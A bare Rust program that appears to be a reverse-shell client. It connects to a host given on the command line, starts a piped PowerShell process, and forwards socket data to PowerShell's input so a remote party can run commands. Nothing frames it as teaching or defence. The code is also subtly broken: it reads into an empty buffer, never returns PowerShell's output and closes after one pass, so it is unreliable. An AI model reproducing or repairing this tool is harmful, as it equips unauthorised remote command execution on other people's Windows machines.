use std::io::prelude::*;
use std::net::{Shutdown, TcpStream};
use std::process::{Command, Stdio};
use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();
    let mut stream = TcpStream::connect(&args[1])
        .expect("Server seems to be down");

    let process = Command::new("powershell")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn().unwrap();

    let buffer = &mut vec![];

    stream
        .read(buffer)
        .expect("Couldn't read powershell io");

    process.stdin.unwrap()
        .write_all(&buffer)
        .expect("Couldn't write powershell message");

    stream
        .shutdown(Shutdown::Both)
        .expect("Couldn't shutdown stream")
}
